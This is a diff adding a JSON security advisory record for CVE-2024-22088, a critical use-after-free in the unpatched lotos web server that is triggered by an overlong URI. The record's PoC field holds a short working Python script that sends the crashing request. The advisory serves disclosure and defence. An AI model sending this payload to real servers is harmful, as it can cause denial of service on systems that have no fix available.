@@ -1,0 +1,44 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentiality": "HIGH",
+        "integrity": "HIGH",
+        "availability": "HIGH"
+    },
+    "credit": [
+        "Halcy0nic"
+    ],
+    "cvssDetails": [],
+    "cvssScore": 9.8,
+    "disclosureTime": "2024-01-05 04:44:33",
+    "epssDetails": null,
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-UNMANAGED-CHENDOTJSLOTOS-6144800",
+    "identifiers": {
+        "CVE": [
+            "CVE-2024-22088"
+        ],
+        "CWE": [
+            "CWE-416"
+        ]
+    },
+    "language": "cpp",
+    "malicious": false,
+    "packageManager": "unmanaged",
+    "publicationTime": "2024-01-05 12:50:15",
+    "remediation": "There is no fixed version for chendotjs/lotos . ",
+    "severity": "critical",
+    "socialTrendAlert": false,
+    "title": "Use After Free",
+    "vulnDescription": {
+        "Overview": "Affected versions of this package are vulnerable to Use After Free via the buffer_avail function at buffer.h when processing a long URI due to improper handling of realloc . An attacker can submit a specially crafted URI to the server and can lead to denial of service or authentication bypass. ",
+        "PoC": "#!/usr/bin/env python3 import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((\"localhost\", 8888)) sock.send(b\"GET /\"+b\"?\"*20000+b\" HTTP/1.1\\r\\nHost:localhost:8001\\r\\n\\r\\n\") response = sock.recv(4096) sock.close() "
+    },
+    "source_code": []
+}
